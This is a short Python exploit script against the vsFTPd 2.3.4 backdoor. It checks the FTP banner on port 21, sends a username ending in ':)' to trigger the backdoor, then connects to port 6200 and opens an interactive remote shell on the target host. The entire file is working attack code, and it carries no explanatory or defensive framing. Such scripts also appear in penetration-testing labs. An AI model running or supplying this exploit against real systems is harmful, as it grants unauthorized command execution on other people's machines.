#!/usr/bin/python3

import socket
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    print('   [+] Exiting...')
    exit(0)

signal(SIGINT, handler)

parser = argparse.ArgumentParser()
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()

host = args.host
portFTP = 21

user = "USER nergal:)\r\n"
password = "PASS pass\r\n"

# --- FTP Connection ---
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, portFTP))

banner = s.recv(1024)
if b"vsFTPd 2.3.4" not in banner:
    print("[-] Target does not appear vulnerable")
    s.close()
    exit(1)

s.sendall(user.encode())
s.recv(1024)

s.sendall(password.encode())
s.recv(1024)

s.close()

# --- Backdoor Shell ---
shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shell.connect((host, 6200))

print("[+] Success, shell opened")
print("[+] Send `exit` to quit shell")

while True:
    cmd = input("$ ")
    if cmd.lower() == "exit":
        break
    shell.sendall((cmd + "\n").encode())
    response = shell.recv(4096)
    print(response.decode(errors="ignore"))

shell.close()